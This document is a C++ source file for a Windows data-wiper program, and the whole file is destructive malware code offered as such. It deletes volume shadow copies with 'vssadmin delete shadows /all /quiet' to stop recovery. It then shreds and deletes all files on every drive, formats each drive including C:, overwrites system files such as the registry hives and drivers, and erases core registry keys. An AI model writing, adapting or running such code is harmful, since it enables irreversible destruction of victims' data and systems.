#include <windows.h>
#include <string>
#include <filesystem>
#include <shlwapi.h>
#include <iostream>
#include <cstdlib>
#include <fstream>
#include <thread>
#include <vector>
#include <mutex>
#include <atomic>

#pragma comment(lib, "shlwapi.lib")

std::mutex logMutex;  // Mutex for synchronized logging
std::atomic<int> totalFilesShredded(0);  // To track shredded files

// Function to log messages in a thread-safe manner
void logMessage(const std::string& message) {
    std::lock_guard<std::mutex> guard(logMutex);
    std::cout << message << std::endl;
}

// Function to overwrite file contents with random data (multiple passes for security)
void shredFile(const std::string& filePath, int passes = 3) {
    const size_t bufferSize = 1024 * 1024;  // 1 MB buffer
    char buffer[bufferSize];
    std::string logMsg;

    // Open the file for reading and writing
    FILE* file = fopen(filePath.c_str(), "r+b");
    if (file) {
        logMsg = "Shredding: " + filePath;
        logMessage(logMsg);
        
        // Perform multiple passes for increased security
        for (int pass = 0; pass < passes; ++pass) {
            // Use a different pattern for each pass (random data, zeroes, ones)
            for (size_t i = 0; i < bufferSize; ++i) {
                buffer[i] = (pass == 0) ? rand() % 256 : (pass == 1) ? 0x00 : 0xFF;
            }
            // Overwrite the file with data
            fseek(file, 0, SEEK_SET);
            fwrite(buffer, sizeof(char), bufferSize, file);
        }
        fclose(file);

        // Delete the file after shredding
        if (!DeleteFileA(filePath.c_str())) {
            logMessage("Failed to delete file: " + filePath);
        } else {
            totalFilesShredded++;
        }
    } else {
        // Log if file couldn't be opened
        logMessage("Error opening file: " + filePath);
    }
}

// Function to remove shadow copies (with error handling)
void removeShadowCopies() {
    std::string command = "vssadmin delete shadows /all /quiet";
    if (system(command.c_str()) != 0) {
        logMessage("Failed to delete shadow copies!");
    }
}

// Function to recursively wipe files in a directory
void wipeFilesInDirectory(const std::string& directory) {
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(directory)) {
            if (entry.is_regular_file()) {
                shredFile(entry.path().string());  // Shred the file
            }
        }
    } catch (const std::exception& e) {
        logMessage("Error processing directory: " + directory + " Error: " + e.what());
    }
}

// Function to wipe registry key and its contents (including subkeys and values)
void wipeRegistryKey(HKEY hKey, const std::string& subKey) {
    HKEY hOpenKey;
    if (RegOpenKeyExA(hKey, subKey.c_str(), 0, KEY_SET_VALUE, &hOpenKey) == ERROR_SUCCESS) {
        // Delete all values first
        DWORD index = 0;
        char valueName[256];
        DWORD valueNameSize;
        while (RegEnumValueA(hOpenKey, index, valueName, &valueNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            RegDeleteValueA(hOpenKey, valueName);
            index++;
        }
        // Now delete subkeys
        RegDeleteTreeA(hOpenKey, NULL);
        RegCloseKey(hOpenKey);
    } else {
        logMessage("Error opening registry key: " + subKey);
    }
}

// Function to format a drive (absolute wipe)
void formatDrive(const std::string& driveLetter) {
    std::string command = "format " + driveLetter + ": /Q /FS:FAT32 /V:WIPER /X /Y";
    if (system(command.c_str()) != 0) {
        logMessage("Failed to format drive: " + driveLetter);
    }
}

// Function to wipe all drives on the system
void wipeSystemDrives() {
    char drives[255];
    DWORD dwDrives = GetLogicalDriveStringsA(255, drives);

    std::vector<std::thread> threads;
    for (int i = 0; i < dwDrives; i += 4) {
        std::string drive = std::string(1, drives[i]);

        // Spawn a thread to wipe the drive (including system drive)
        threads.push_back(std::thread([drive]() {
            wipeFilesInDirectory(drive);
            formatDrive(drive);  // Format the drive (absolute wipe)
        }));
    }

    // Wait for all threads to finish
    for (auto& t : threads) {
        t.join();
    }
}

// Function to wipe critical system files
void wipeCriticalSystemFiles() {
    std::vector<std::string> systemFiles = {
        "C:\\pagefile.sys",
        "C:\\hiberfil.sys",
        "C:\\Windows\\System32\\config",
        "C:\\Windows\\System32\\drivers"
    };

    for (const auto& file : systemFiles) {
        shredFile(file);  // Shred each critical file
    }
}

// Function to wipe registry data (more registry keys)
void wipeRegistryData() {
    // Wipe all registry keys
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion");
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services");
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes");
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control");
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System");
    wipeRegistryKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Enum");
    wipeRegistryKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion");
    wipeRegistryKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer");
}

// Main function to execute the wiper process
int main() {
    try {
        logMessage("Starting the absolute wiper process...");

        // Start wiping system drives (including system drive C:), and delete files
        wipeSystemDrives();

        // Wipe critical system files and registry
        wipeCriticalSystemFiles();

        // Wipe registry data
        wipeRegistryData();

        logMessage("Total files shredded: " + std::to_string(totalFilesShredded.load()));

        logMessage("Absolute wiper process completed.");
    } catch (const std::exception& ex) {
        logMessage("Error: " + std::string(ex.what()));
        return 1;
    }
    return 0;
}
